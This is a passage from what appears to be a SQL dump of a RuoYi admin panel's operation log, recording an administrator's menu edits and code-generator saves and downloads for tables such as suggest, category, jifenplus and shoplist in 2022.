XX','{\"menuId\":[\"2000\"],\"parentId\":[\"0\"],\"menuType\":[\"M\"],\"menuName\":[\"用户信息\"],\"url\":[\"#\"],\"target\":[\"menuItem\"],\"perms\":[\"\"],\"orderNum\":[\"4\"],\"icon\":[\"fa fa-address-book-o\"],\"visible\":[\"0\"],\"isRefresh\":[\"1\"]}','{\"msg\":\"操作成功\",\"code\":0}',0,NULL,'2022-01-06 00:00:35'),(112,'菜单管理',3,'com.ruoyi.project.system.menu.controller.MenuController.remove()','GET',1,'admin','研发部门','/system/menu/remove/4','1.202.230.130','XX XX','4','{\"msg\":\"菜单已分配,不允许删除\",\"code\":301}',0,NULL,'2022-01-06 00:00:47'),(113,'菜单管理',2,'com.ruoyi.project.system.menu.controller.MenuController.editSave()','POST',1,'admin','研发部门','/system/menu/edit','1.202.230.130','XX XX','{\"menuId\":[\"2001\"],\"parentId\":[\"2000\"],\"menuType\":[\"C\"],\"menuName\":[\"用户信息\"],\"url\":[\"/system/userinfo\"],\"target\":[\"menuItem\"],\"perms\":[\"system:userinfo:view\"],\"orderNum\":[\"1\"],\"icon\":[\"#\"],\"visible\":[\"0\"],\"isRefresh\":[\"1\"]}','{\"msg\":\"操作成功\",\"code\":0}',0,NULL,'2022-01-06 00:01:22'),(114,'代码生成',2,'com.ruoyi.project.tool.gen.controller.GenController.editSave()','POST',1,'admin','研发部门','/tool/gen/edit','1.202.230.167','XX XX','{\"tableId\":[\"13\"],\"tableName\":[\"suggest\"],\"tableComment\":[\"建议\"],\"className\":[\"Suggest\"],\"functionAuthor\":[\"ruoyi\"],\"remark\":[\"\"],\"columns[0].columnId\":[\"91\"],\"columns[0].sort\":[\"1\"],\"columns[0].columnComment\":[\"openid\"],\"columns[0].javaType\":[\"String\"],\"columns[0].javaField\":[\"openid\"],\"columns[0].isInsert\":[\"1\"],\"columns[0].isEdit\":[\"1\"],\"columns[0].isList\":[\"1\"],\"columns[0].isQuery\":[\"1\"],\"columns[0].queryType\":[\"EQ\"],\"columns[0].isRequired\":[\"1\"],\"columns[0].htmlType\":[\"input\"],\"columns[0].dictType\":[\"\"],\"columns[1].columnId\":[\"92\"],\"columns[1].sort\":[\"2\"],\"columns[1].columnComment\":[\"昵称\"],\"columns[1].javaType\":[\"String\"],\"columns[1].javaField\":[\"nickname\"],\"columns[1].isInsert\":[\"1\"],\"columns[1].isEdit\":[\"1\"],\"columns[1].isList\":[\"1\"],\"columns[1].isQuery\":[\"1\"],\"columns[1].queryType\":[\"LIKE\"],\"columns[1].htmlType\":[\"input\"],\"columns[1].dictType\":[\"\"],\"columns[2].columnId\":[\"93\"],\"columns[2].sort\":[\"3\"],\"columns[2].columnComment\":[\"头像\"],\"columns[2].javaType\":[\"String\"],\"columns[2].javaField\":[\"avatar\"],\"columns[2].isInsert\":[\"1\"],\"columns[2].isEdit\":[\"1\"],\"columns[2].isList\":[\"1\"],\"columns[2].isQuery\":[\"1\"],\"columns[2].queryType\":[\"EQ\"],\"columns[2].htmlType\":[\"textarea\"],\"columns[2].dictType\":[\"\"],\"columns[3].columnId\":[\"94\"],\"columns[3].sort\":[\"4\"],\"columns[3].columnComment\":[\"建议\"],\"columns[3].javaType\":[\"String\"],\"columns[3].javaField\":[\"suggest\"],\"columns[3].isInsert\":[\"1\"],\"columns[3].isEdit\":[\"1\"],\"columns[3].isList\":[\"1\"],\"columns[3].isQuery\":[\"1\"],\"columns[3].queryType\":[\"EQ\"],\"columns[3].htmlType\":[\"textarea\"],\"columns[3].dictType\":[\"\"],\"columns[4].columnId\":[\"95\"],\"columns[4].sort\":[\"5\"],\"columns[4].columnComment\":[\"创建时间\"],\"columns[4].javaType\":[\"Date\"],\"columns[4].javaField\":[\"createTime\"],\"columns[4].isInsert\":[\"1\"],\"columns[4].queryType\":[\"EQ\"],\"columns[4].htmlType\":[\"datetime\"],\"columns[4].dictType\":[\"\"],\"tplCategory\":[\"crud\"],\"packageName\":[\"com.ruoyi.project.system\"],\"moduleName\":[\"system\"],\"businessName\":[\"suggest\"],\"functionName\":[\"建议\"],\"params[p','{\"msg\":\"操作成功\",\"code\":0}',0,NULL,'2022-01-06 11:27:49'),(115,'代码生成',2,'com.ruoyi.project.tool.gen.controller.GenController.editSave()','POST',1,'admin','研发部门','/tool/gen/edit','1.202.230.167','XX XX','{\"tableId\":[\"13\"],\"tableName\":[\"suggest\"],\"tableComment\":[\"建议\"],\"className\":[\"Suggest\"],\"functionAuthor\":[\"ruoyi\"],\"remark\":[\"\"],\"columns[0].columnId\":[\"91\"],\"columns[0].sort\":[\"1\"],\"columns[0].columnComment\":[\"openid\"],\"columns[0].javaType\":[\"String\"],\"columns[0].javaField\":[\"openid\"],\"columns[0].isInsert\":[\"1\"],\"columns[0].isEdit\":[\"1\"],\"columns[0].isList\":[\"1\"],\"columns[0].isQuery\":[\"1\"],\"columns[0].queryType\":[\"EQ\"],\"columns[0].isRequired\":[\"1\"],\"columns[0].htmlType\":[\"input\"],\"columns[0].dictType\":[\"\"],\"columns[1].columnId\":[\"92\"],\"columns[1].sort\":[\"2\"],\"columns[1].columnComment\":[\"昵称\"],\"columns[1].javaType\":[\"String\"],\"columns[1].javaField\":[\"nickname\"],\"columns[1].isInsert\":[\"1\"],\"columns[1].isEdit\":[\"1\"],\"columns[1].isList\":[\"1\"],\"columns[1].isQuery\":[\"1\"],\"columns[1].queryType\":[\"LIKE\"],\"columns[1].htmlType\":[\"input\"],\"columns[1].dictType\":[\"\"],\"columns[2].columnId\":[\"93\"],\"columns[2].sort\":[\"3\"],\"columns[2].columnComment\":[\"头像\"],\"columns[2].javaType\":[\"String\"],\"columns[2].javaField\":[\"avatar\"],\"columns[2].isInsert\":[\"1\"],\"columns[2].isEdit\":[\"1\"],\"columns[2].isList\":[\"1\"],\"columns[2].isQuery\":[\"1\"],\"columns[2].queryType\":[\"EQ\"],\"columns[2].htmlType\":[\"textarea\"],\"columns[2].dictType\":[\"\"],\"columns[3].columnId\":[\"94\"],\"columns[3].sort\":[\"4\"],\"columns[3].columnComment\":[\"建议\"],\"columns[3].javaType\":[\"String\"],\"columns[3].javaField\":[\"suggest\"],\"columns[3].isInsert\":[\"1\"],\"columns[3].isEdit\":[\"1\"],\"columns[3].isList\":[\"1\"],\"columns[3].isQuery\":[\"1\"],\"columns[3].queryType\":[\"EQ\"],\"columns[3].htmlType\":[\"textarea\"],\"columns[3].dictType\":[\"\"],\"columns[4].columnId\":[\"95\"],\"columns[4].sort\":[\"5\"],\"columns[4].columnComment\":[\"创建时间\"],\"columns[4].javaType\":[\"Date\"],\"columns[4].javaField\":[\"createTime\"],\"columns[4].isInsert\":[\"1\"],\"columns[4].queryType\":[\"EQ\"],\"columns[4].htmlType\":[\"datetime\"],\"columns[4].dictType\":[\"\"],\"tplCategory\":[\"crud\"],\"packageName\":[\"com.ruoyi.project.system\"],\"moduleName\":[\"system\"],\"businessName\":[\"suggest\"],\"functionName\":[\"建议\"],\"params[p','{\"msg\":\"操作成功\",\"code\":0}',0,NULL,'2022-01-06 11:28:01'),(116,'代码生成',2,'com.ruoyi.project.tool.gen.controller.GenController.editSave()','POST',1,'admin','研发部门','/tool/gen/edit','1.202.230.167','XX XX','{\"tableId\":[\"5\"],\"tableName\":[\"category\"],\"tableComment\":[\"商品分类\"],\"className\":[\"Category\"],\"functionAuthor\":[\"ruoyi\"],\"remark\":[\"\"],\"columns[0].columnId\":[\"25\"],\"columns[0].sort\":[\"1\"],\"columns[0].columnComment\":[\"ID\"],\"columns[0].javaType\":[\"Long\"],\"columns[0].javaField\":[\"id\"],\"columns[0].isInsert\":[\"1\"],\"columns[0].queryType\":[\"EQ\"],\"columns[0].htmlType\":[\"input\"],\"columns[0].dictType\":[\"\"],\"columns[1].columnId\":[\"26\"],\"columns[1].sort\":[\"2\"],\"columns[1].columnComment\":[\"分类Id\"],\"columns[1].javaType\":[\"String\"],\"columns[1].javaField\":[\"category\"],\"columns[1].isInsert\":[\"1\"],\"columns[1].isEdit\":[\"1\"],\"columns[1].isList\":[\"1\"],\"columns[1].isQuery\":[\"1\"],\"columns[1].queryType\":[\"EQ\"],\"columns[1].htmlType\":[\"input\"],\"columns[1].dictType\":[\"\"],\"columns[2].columnId\":[\"27\"],\"columns[2].sort\":[\"3\"],\"columns[2].columnComment\":[\"分类名字\"],\"columns[2].javaType\":[\"String\"],\"columns[2].javaField\":[\"catename\"],\"columns[2].isInsert\":[\"1\"],\"columns[2].isEdit\":[\"1\"],\"columns[2].isList\":[\"1\"],\"columns[2].isQuery\":[\"1\"],\"columns[2].queryType\":[\"LIKE\"],\"columns[2].htmlType\":[\"input\"],\"columns[2].dictType\":[\"\"],\"columns[3].columnId\":[\"28\"],\"columns[3].sort\":[\"4\"],\"columns[3].columnComment\":[\"描述\"],\"columns[3].javaType\":[\"String\"],\"columns[3].javaField\":[\"miaoshu\"],\"columns[3].isInsert\":[\"1\"],\"columns[3].isEdit\":[\"1\"],\"columns[3].isList\":[\"1\"],\"columns[3].isQuery\":[\"1\"],\"columns[3].queryType\":[\"EQ\"],\"columns[3].htmlType\":[\"input\"],\"columns[3].dictType\":[\"\"],\"columns[4].columnId\":[\"29\"],\"columns[4].sort\":[\"5\"],\"columns[4].columnComment\":[\"创建时间\"],\"columns[4].javaType\":[\"Date\"],\"columns[4].javaField\":[\"createTime\"],\"columns[4].isInsert\":[\"1\"],\"columns[4].queryType\":[\"EQ\"],\"columns[4].htmlType\":[\"datetime\"],\"columns[4].dictType\":[\"\"],\"tplCategory\":[\"crud\"],\"packageName\":[\"com.ruoyi.project.system\"],\"moduleName\":[\"system\"],\"businessName\":[\"category\"],\"functionName\":[\"商品分类\"],\"params[parentMenuId]\":[\"2000\"],\"params[parentMenuName]\":[\"用户信息\"],\"genType\":[\"0\"],\"genPath\":[\"/\"],\"subTableName\":[\"\"],\"par','{\"msg\":\"操作成功\",\"code\":0}',0,NULL,'2022-01-06 11:28:42'),(117,'代码生成',2,'com.ruoyi.project.tool.gen.controller.GenController.editSave()','POST',1,'admin','研发部门','/tool/gen/edit','1.202.230.167','XX XX','{\"tableId\":[\"6\"],\"tableName\":[\"demojob\"],\"tableComment\":[\"定时任务调度表\"],\"className\":[\"Demojob\"],\"functionAuthor\":[\"ruoyi\"],\"remark\":[\"\"],\"columns[0].columnId\":[\"30\"],\"columns[0].sort\":[\"1\"],\"columns[0].columnComment\":[\"任务ID\"],\"columns[0].javaType\":[\"Long\"],\"columns[0].javaField\":[\"jobId\"],\"columns[0].isInsert\":[\"1\"],\"columns[0].queryType\":[\"EQ\"],\"columns[0].htmlType\":[\"input\"],\"columns[0].dictType\":[\"\"],\"columns[1].columnId\":[\"31\"],\"columns[1].sort\":[\"2\"],\"columns[1].columnComment\":[\"任务名称\"],\"columns[1].javaType\":[\"String\"],\"columns[1].javaField\":[\"jobName\"],\"columns[1].isInsert\":[\"1\"],\"columns[1].queryType\":[\"LIKE\"],\"columns[1].htmlType\":[\"input\"],\"columns[1].dictType\":[\"\"],\"columns[2].columnId\":[\"32\"],\"columns[2].sort\":[\"3\"],\"columns[2].columnComment\":[\"任务组名\"],\"columns[2].javaType\":[\"String\"],\"columns[2].javaField\":[\"jobGroup\"],\"columns[2].isInsert\":[\"1\"],\"columns[2].queryType\":[\"EQ\"],\"columns[2].htmlType\":[\"input\"],\"columns[2].dictType\":[\"\"],\"columns[3].columnId\":[\"33\"],\"columns[3].sort\":[\"4\"],\"columns[3].columnComment\":[\"调用目标字符串\"],\"columns[3].javaType\":[\"String\"],\"columns[3].javaField\":[\"invokeTarget\"],\"columns[3].isInsert\":[\"1\"],\"columns[3].isEdit\":[\"1\"],\"columns[3].isList\":[\"1\"],\"columns[3].isQuery\":[\"1\"],\"columns[3].queryType\":[\"EQ\"],\"columns[3].isRequired\":[\"1\"],\"columns[3].htmlType\":[\"textarea\"],\"columns[3].dictType\":[\"\"],\"columns[4].columnId\":[\"34\"],\"columns[4].sort\":[\"5\"],\"columns[4].columnComment\":[\"cron执行表达式\"],\"columns[4].javaType\":[\"String\"],\"columns[4].javaField\":[\"cronExpression\"],\"columns[4].isInsert\":[\"1\"],\"columns[4].isEdit\":[\"1\"],\"columns[4].isList\":[\"1\"],\"columns[4].isQuery\":[\"1\"],\"columns[4].queryType\":[\"EQ\"],\"columns[4].htmlType\":[\"input\"],\"columns[4].dictType\":[\"\"],\"columns[5].columnId\":[\"35\"],\"columns[5].sort\":[\"6\"],\"columns[5].columnComment\":[\"计划执行错误策略（1立即执行 2执行一次 3放弃执行）\"],\"columns[5].javaType\":[\"String\"],\"columns[5].javaField\":[\"misfirePolicy\"],\"columns[5].isInsert\":[\"1\"],\"columns[5].isEdit\":[\"1\"],\"columns[5].isList\":[\"1\"],\"columns[5].isQuery\":','{\"msg\":\"操作成功\",\"code\":0}',0,NULL,'2022-01-06 11:28:51'),(118,'代码生成',8,'com.ruoyi.project.tool.gen.controller.GenController.download()','GET',1,'admin','研发部门','/tool/gen/download/jifenminus','124.126.96.184','XX XX','\"jifenminus\"',NULL,0,NULL,'2022-04-04 22:25:41'),(119,'代码生成',8,'com.ruoyi.project.tool.gen.controller.GenController.download()','GET',1,'admin','研发部门','/tool/gen/download/jifenminus','124.126.96.184','XX XX','\"jifenminus\"',NULL,0,NULL,'2022-04-04 22:25:41'),(120,'代码生成',8,'com.ruoyi.project.tool.gen.controller.GenController.download()','GET',1,'admin','研发部门','/tool/gen/download/suggest','124.126.96.184','XX XX','\"suggest\"',NULL,0,NULL,'2022-04-04 22:26:14'),(121,'代码生成',8,'com.ruoyi.project.tool.gen.controller.GenController.download()','GET',1,'admin','研发部门','/tool/gen/download/suggest','124.126.96.184','XX XX','\"suggest\"',NULL,0,NULL,'2022-04-04 22:26:14'),(122,'菜单管理',1,'com.ruoyi.project.system.menu.controller.MenuController.addSave()','POST',1,'admin','研发部门','/system/menu/add','124.126.96.184','XX XX','{\"parentId\":[\"0\"],\"menuType\":[\"M\"],\"menuName\":[\"积分管理\"],\"url\":[\"\"],\"target\":[\"menuItem\"],\"perms\":[\"\"],\"orderNum\":[\"5\"],\"icon\":[\"fa fa-line-chart\"],\"visible\":[\"0\"],\"isRefresh\":[\"1\"]}','{\"msg\":\"操作成功\",\"code\":0}',0,NULL,'2022-04-04 22:29:35'),(123,'代码生成',2,'com.ruoyi.project.tool.gen.controller.GenController.editSave()','POST',1,'admin','研发部门','/tool/gen/edit','124.126.96.184','XX XX','{\"tableId\":[\"7\"],\"tableName\":[\"jifenminus\"],\"tableComment\":[\"积分增加\"],\"className\":[\"Jifenminus\"],\"functionAuthor\":[\"ruoyi\"],\"remark\":[\"\"],\"columns[0].columnId\":[\"43\"],\"columns[0].sort\":[\"1\"],\"columns[0].columnComment\":[\"\"],\"columns[0].javaType\":[\"Long\"],\"columns[0].javaField\":[\"id\"],\"columns[0].isInsert\":[\"1\"],\"columns[0].queryType\":[\"EQ\"],\"columns[0].htmlType\":[\"input\"],\"columns[0].dictType\":[\"\"],\"columns[1].columnId\":[\"44\"],\"columns[1].sort\":[\"2\"],\"columns[1].columnComment\":[\"openid\"],\"columns[1].javaType\":[\"String\"],\"columns[1].javaField\":[\"openid\"],\"columns[1].isInsert\":[\"1\"],\"columns[1].isEdit\":[\"1\"],\"columns[1].isList\":[\"1\"],\"columns[1].isQuery\":[\"1\"],\"columns[1].queryType\":[\"EQ\"],\"columns[1].isRequired\":[\"1\"],\"columns[1].htmlType\":[\"input\"],\"columns[1].dictType\":[\"\"],\"columns[2].columnId\":[\"45\"],\"columns[2].sort\":[\"3\"],\"columns[2].columnComment\":[\"昵称\"],\"columns[2].javaType\":[\"String\"],\"columns[2].javaField\":[\"name\"],\"columns[2].isInsert\":[\"1\"],\"columns[2].isEdit\":[\"1\"],\"columns[2].isList\":[\"1\"],\"columns[2].isQuery\":[\"1\"],\"columns[2].queryType\":[\"LIKE\"],\"columns[2].htmlType\":[\"input\"],\"columns[2].dictType\":[\"\"],\"columns[3].columnId\":[\"46\"],\"columns[3].sort\":[\"4\"],\"columns[3].columnComment\":[\"手机\"],\"columns[3].javaType\":[\"String\"],\"columns[3].javaField\":[\"phone\"],\"columns[3].isInsert\":[\"1\"],\"columns[3].isEdit\":[\"1\"],\"columns[3].isList\":[\"1\"],\"columns[3].isQuery\":[\"1\"],\"columns[3].queryType\":[\"EQ\"],\"columns[3].htmlType\":[\"input\"],\"columns[3].dictType\":[\"\"],\"columns[4].columnId\":[\"47\"],\"columns[4].sort\":[\"5\"],\"columns[4].columnComment\":[\"地址\"],\"columns[4].javaType\":[\"String\"],\"columns[4].javaField\":[\"address\"],\"columns[4].isInsert\":[\"1\"],\"columns[4].isEdit\":[\"1\"],\"columns[4].isList\":[\"1\"],\"columns[4].isQuery\":[\"1\"],\"columns[4].queryType\":[\"EQ\"],\"columns[4].htmlType\":[\"input\"],\"columns[4].dictType\":[\"\"],\"columns[5].columnId\":[\"48\"],\"columns[5].sort\":[\"6\"],\"columns[5].columnComment\":[\"详细地址\"],\"columns[5].javaType\":[\"String\"],\"columns[5].javaField\":[\"addressDetail\"],\"col','{\"msg\":\"操作成功\",\"code\":0}',0,NULL,'2022-04-04 22:30:18'),(124,'代码生成',8,'com.ruoyi.project.tool.gen.controller.GenController.download()','GET',1,'admin','研发部门','/tool/gen/download/jifenminus','124.126.96.184','XX XX','\"jifenminus\"',NULL,0,NULL,'2022-04-04 22:30:26'),(125,'代码生成',8,'com.ruoyi.project.tool.gen.controller.GenController.download()','GET',1,'admin','研发部门','/tool/gen/download/jifenminus','124.126.96.184','XX XX','\"jifenminus\"',NULL,0,NULL,'2022-04-04 22:30:33'),(126,'菜单管理',1,'com.ruoyi.project.system.menu.controller.MenuController.addSave()','POST',1,'admin','研发部门','/system/menu/add','124.126.96.184','XX XX','{\"parentId\":[\"0\"],\"menuType\":[\"M\"],\"menuName\":[\"商品管理\"],\"url\":[\"\"],\"target\":[\"menuItem\"],\"perms\":[\"\"],\"orderNum\":[\"6\"],\"icon\":[\"fa fa-tags\"],\"visible\":[\"0\"],\"isRefresh\":[\"1\"]}','{\"msg\":\"操作成功\",\"code\":0}',0,NULL,'2022-04-04 22:34:17'),(127,'代码生成',2,'com.ruoyi.project.tool.gen.controller.GenController.editSave()','POST',1,'admin','研发部门','/tool/gen/edit','124.126.96.184','XX XX','{\"tableId\":[\"5\"],\"tableName\":[\"category\"],\"tableComment\":[\"商品分类\"],\"className\":[\"Category\"],\"functionAuthor\":[\"ruoyi\"],\"remark\":[\"\"],\"columns[0].columnId\":[\"25\"],\"columns[0].sort\":[\"1\"],\"columns[0].columnComment\":[\"ID\"],\"columns[0].javaType\":[\"Long\"],\"columns[0].javaField\":[\"id\"],\"columns[0].isInsert\":[\"1\"],\"columns[0].queryType\":[\"EQ\"],\"columns[0].htmlType\":[\"input\"],\"columns[0].dictType\":[\"\"],\"columns[1].columnId\":[\"26\"],\"columns[1].sort\":[\"2\"],\"columns[1].columnComment\":[\"分类Id\"],\"columns[1].javaType\":[\"String\"],\"columns[1].javaField\":[\"category\"],\"columns[1].isInsert\":[\"1\"],\"columns[1].isEdit\":[\"1\"],\"columns[1].isList\":[\"1\"],\"columns[1].isQuery\":[\"1\"],\"columns[1].queryType\":[\"EQ\"],\"columns[1].htmlType\":[\"input\"],\"columns[1].dictType\":[\"\"],\"columns[2].columnId\":[\"27\"],\"columns[2].sort\":[\"3\"],\"columns[2].columnComment\":[\"分类名字\"],\"columns[2].javaType\":[\"String\"],\"columns[2].javaField\":[\"catename\"],\"columns[2].isInsert\":[\"1\"],\"columns[2].isEdit\":[\"1\"],\"columns[2].isList\":[\"1\"],\"columns[2].isQuery\":[\"1\"],\"columns[2].queryType\":[\"LIKE\"],\"columns[2].htmlType\":[\"input\"],\"columns[2].dictType\":[\"\"],\"columns[3].columnId\":[\"28\"],\"columns[3].sort\":[\"4\"],\"columns[3].columnComment\":[\"描述\"],\"columns[3].javaType\":[\"String\"],\"columns[3].javaField\":[\"miaoshu\"],\"columns[3].isInsert\":[\"1\"],\"columns[3].isEdit\":[\"1\"],\"columns[3].isList\":[\"1\"],\"columns[3].isQuery\":[\"1\"],\"columns[3].queryType\":[\"EQ\"],\"columns[3].htmlType\":[\"input\"],\"columns[3].dictType\":[\"\"],\"columns[4].columnId\":[\"29\"],\"columns[4].sort\":[\"5\"],\"columns[4].columnComment\":[\"创建时间\"],\"columns[4].javaType\":[\"Date\"],\"columns[4].javaField\":[\"createTime\"],\"columns[4].isInsert\":[\"1\"],\"columns[4].queryType\":[\"EQ\"],\"columns[4].htmlType\":[\"datetime\"],\"columns[4].dictType\":[\"\"],\"tplCategory\":[\"crud\"],\"packageName\":[\"com.ruoyi.project.system\"],\"moduleName\":[\"system\"],\"businessName\":[\"category\"],\"functionName\":[\"商品分类\"],\"params[parentMenuId]\":[\"2026\"],\"params[parentMenuName]\":[\"商品管理\"],\"genType\":[\"0\"],\"genPath\":[\"/\"],\"subTableName\":[\"\"],\"par','{\"msg\":\"操作成功\",\"code\":0}',0,NULL,'2022-04-04 22:35:06'),(128,'代码生成',8,'com.ruoyi.project.tool.gen.controller.GenController.download()','GET',1,'admin','研发部门','/tool/gen/download/category','124.126.96.184','XX XX','\"category\"',NULL,0,NULL,'2022-04-04 22:35:10'),(129,'代码生成',8,'com.ruoyi.project.tool.gen.controller.GenController.download()','GET',1,'admin','研发部门','/tool/gen/download/category','124.126.96.184','XX XX','\"category\"',NULL,0,NULL,'2022-04-04 22:35:10'),(130,'代码生成',2,'com.ruoyi.project.tool.gen.controller.GenController.editSave()','POST',1,'admin','研发部门','/tool/gen/edit','124.126.96.184','XX XX','{\"tableId\":[\"8\"],\"tableName\":[\"jifenplus\"],\"tableComment\":[\"积分增加\"],\"className\":[\"Jifenplus\"],\"functionAuthor\":[\"ruoyi\"],\"remark\":[\"\"],\"columns[0].columnId\":[\"54\"],\"columns[0].sort\":[\"1\"],\"columns[0].columnComment\":[\"\"],\"columns[0].javaType\":[\"Long\"],\"columns[0].javaField\":[\"id\"],\"columns[0].isInsert\":[\"1\"],\"columns[0].queryType\":[\"EQ\"],\"columns[0].htmlType\":[\"input\"],\"columns[0].dictType\":[\"\"],\"columns[1].columnId\":[\"55\"],\"columns[1].sort\":[\"2\"],\"columns[1].columnComment\":[\"openid\"],\"columns[1].javaType\":[\"String\"],\"columns[1].javaField\":[\"openid\"],\"columns[1].isInsert\":[\"1\"],\"columns[1].isEdit\":[\"1\"],\"columns[1].isList\":[\"1\"],\"columns[1].isQuery\":[\"1\"],\"columns[1].queryType\":[\"EQ\"],\"columns[1].isRequired\":[\"1\"],\"columns[1].htmlType\":[\"input\"],\"columns[1].dictType\":[\"\"],\"columns[2].columnId\":[\"56\"],\"columns[2].sort\":[\"3\"],\"columns[2].columnComment\":[\"设备id\"],\"columns[2].javaType\":[\"String\"],\"columns[2].javaField\":[\"techid\"],\"columns[2].isInsert\":[\"1\"],\"columns[2].isEdit\":[\"1\"],\"columns[2].isList\":[\"1\"],\"columns[2].isQuery\":[\"1\"],\"columns[2].queryType\":[\"EQ\"],\"columns[2].isRequired\":[\"1\"],\"columns[2].htmlType\":[\"input\"],\"columns[2].dictType\":[\"\"],\"columns[3].columnId\":[\"57\"],\"columns[3].sort\":[\"4\"],\"columns[3].columnComment\":[\"设备蓝牙号\"],\"columns[3].javaType\":[\"String\"],\"columns[3].javaField\":[\"deviceId\"],\"columns[3].isInsert\":[\"1\"],\"columns[3].isEdit\":[\"1\"],\"columns[3].isList\":[\"1\"],\"columns[3].isQuery\":[\"1\"],\"columns[3].queryType\":[\"EQ\"],\"columns[3].isRequired\":[\"1\"],\"columns[3].htmlType\":[\"input\"],\"columns[3].dictType\":[\"\"],\"columns[4].columnId\":[\"58\"],\"columns[4].sort\":[\"5\"],\"columns[4].columnComment\":[\"1春夏，2秋冬,3书籍\"],\"columns[4].javaType\":[\"Long\"],\"columns[4].javaField\":[\"kind\"],\"columns[4].isInsert\":[\"1\"],\"columns[4].isEdit\":[\"1\"],\"columns[4].isList\":[\"1\"],\"columns[4].isQuery\":[\"1\"],\"columns[4].queryType\":[\"EQ\"],\"columns[4].isRequired\":[\"1\"],\"columns[4].htmlType\":[\"input\"],\"columns[4].dictType\":[\"\"],\"columns[5].columnId\":[\"59\"],\"columns[5].sort\":[\"6\"],\"columns[5].co','{\"msg\":\"操作成功\",\"code\":0}',0,NULL,'2022-04-04 22:36:18'),(131,'代码生成',8,'com.ruoyi.project.tool.gen.controller.GenController.download()','GET',1,'admin','研发部门','/tool/gen/download/jifenplus','124.126.96.184','XX XX','\"jifenplus\"',NULL,0,NULL,'2022-04-04 22:36:23'),(132,'代码生成',8,'com.ruoyi.project.tool.gen.controller.GenController.download()','GET',1,'admin','研发部门','/tool/gen/download/jifenplus','124.126.96.184','XX XX','\"jifenplus\"',NULL,0,NULL,'2022-04-04 22:36:23'),(133,'代码生成',2,'com.ruoyi.project.tool.gen.controller.GenController.editSave()','POST',1,'admin','研发部门','/tool/gen/edit','124.126.96.184','XX XX','{\"tableId\":[\"9\"],\"tableName\":[\"kind\"],\"tableComment\":[\"种类\"],\"className\":[\"Kind\"],\"functionAuthor\":[\"ruoyi\"],\"remark\":[\"\"],\"columns[0].columnId\":[\"62\"],\"columns[0].sort\":[\"1\"],\"columns[0].columnComment\":[\"\"],\"columns[0].javaType\":[\"Long\"],\"columns[0].javaField\":[\"kind\"],\"columns[0].isInsert\":[\"1\"],\"columns[0].queryType\":[\"EQ\"],\"columns[0].htmlType\":[\"input\"],\"columns[0].dictType\":[\"\"],\"columns[1].columnId\":[\"63\"],\"columns[1].sort\":[\"2\"],\"columns[1].columnComment\":[\"\"],\"columns[1].javaType\":[\"String\"],\"columns[1].javaField\":[\"kindname\"],\"columns[1].isInsert\":[\"1\"],\"columns[1].isEdit\":[\"1\"],\"columns[1].isList\":[\"1\"],\"columns[1].isQuery\":[\"1\"],\"columns[1].queryType\":[\"LIKE\"],\"columns[1].isRequired\":[\"1\"],\"columns[1].htmlType\":[\"input\"],\"columns[1].dictType\":[\"\"],\"columns[2].columnId\":[\"64\"],\"columns[2].sort\":[\"3\"],\"columns[2].columnComment\":[\"\"],\"columns[2].javaType\":[\"String\"],\"columns[2].javaField\":[\"picture\"],\"columns[2].isInsert\":[\"1\"],\"columns[2].isEdit\":[\"1\"],\"columns[2].isList\":[\"1\"],\"columns[2].isQuery\":[\"1\"],\"columns[2].queryType\":[\"EQ\"],\"columns[2].isRequired\":[\"1\"],\"columns[2].htmlType\":[\"textarea\"],\"columns[2].dictType\":[\"\"],\"columns[3].columnId\":[\"65\"],\"columns[3].sort\":[\"4\"],\"columns[3].columnComment\":[\"\"],\"columns[3].javaType\":[\"String\"],\"columns[3].javaField\":[\"url\"],\"columns[3].isInsert\":[\"1\"],\"columns[3].isEdit\":[\"1\"],\"columns[3].isList\":[\"1\"],\"columns[3].isQuery\":[\"1\"],\"columns[3].queryType\":[\"EQ\"],\"columns[3].isRequired\":[\"1\"],\"columns[3].htmlType\":[\"input\"],\"columns[3].dictType\":[\"\"],\"tplCategory\":[\"crud\"],\"packageName\":[\"com.ruoyi.project.system\"],\"moduleName\":[\"system\"],\"businessName\":[\"kind\"],\"functionName\":[\"种类\"],\"params[parentMenuId]\":[\"2013\"],\"params[parentMenuName]\":[\"积分管理\"],\"genType\":[\"0\"],\"genPath\":[\"/\"],\"subTableName\":[\"\"],\"params[treeCode]\":[\"\"],\"params[treeParentCode]\":[\"\"],\"params[treeName]\":[\"\"]}','{\"msg\":\"操作成功\",\"code\":0}',0,NULL,'2022-04-04 22:38:16'),(134,'代码生成',8,'com.ruoyi.project.tool.gen.controller.GenController.download()','GET',1,'admin','研发部门','/tool/gen/download/kind','124.126.96.184','XX XX','\"kind\"',NULL,0,NULL,'2022-04-04 22:38:23'),(135,'代码生成',8,'com.ruoyi.project.tool.gen.controller.GenController.download()','GET',1,'admin','研发部门','/tool/gen/download/kind','124.126.96.184','XX XX','\"kind\"',NULL,0,NULL,'2022-04-04 22:38:23'),(136,'代码生成',2,'com.ruoyi.project.tool.gen.controller.GenController.editSave()','POST',1,'admin','研发部门','/tool/gen/edit','124.126.96.184','XX XX','{\"tableId\":[\"12\"],\"tableName\":[\"shoplist\"],\"tableComment\":[\"商品列表\"],\"className\":[\"Shoplist\"],\"functionAuthor\":[\"ruoyi\"],\"remark\":[\"\"],\"columns[0].columnId\":[\"83\"],\"columns[0].sort\":[\"1\"],\"columns[0].columnComment\":[\"ID\"],\"columns[0].javaType\":[\"Long\"],\"columns[0].javaField\":[\"id\"],\"columns[0].isInsert\":[\"1\"],\"columns[0].queryType\":[\"EQ\"],\"columns[0].htmlType\":[\"input\"],\"columns[0].dictType\":[\"\"],\"columns[1].columnId\":[\"84\"],\"columns[1].sort\":[\"2\"],\"columns[1].columnComment\":[\"分类Id\"],\"columns[1].javaType\":[\"String\"],\"columns[1].javaField\":[\"category\"],\"columns[1].isInsert\":[\"1\"],\"columns[1].isEdit\":[\"1\"],\"columns[1].isList\":[\"1\"],\"columns[1].isQuery\":[\"1\"],\"columns[1].queryType\":[\"EQ\"],\"columns[1].htmlType\":[\"input\"],\"columns[1].dictType\":[\"\"],\"columns[2].columnId\":[\"85\"],\"columns[2].sort\":[\"3\"],\"columns[2].columnComment\":[\"名字\"],\"columns[2].javaType\":[\"String\"],\"columns[2].javaField\":[\"shopname\"],\"columns[2].isInsert\":[\"1\"],\"columns[2].isEdit\":[\"1\"],\"columns[2].isList\":[\"1\"],\"columns[2].isQuery\":[\"1\"],\"columns[2].queryType\":[\"LIKE\"],\"columns[2].htmlType\":[\"input\"],\"columns[2].dictType\":[\"\"],\"columns[3].columnId\":[\"86\"],\"columns[3].sort\":[\"4\"],\"columns[3]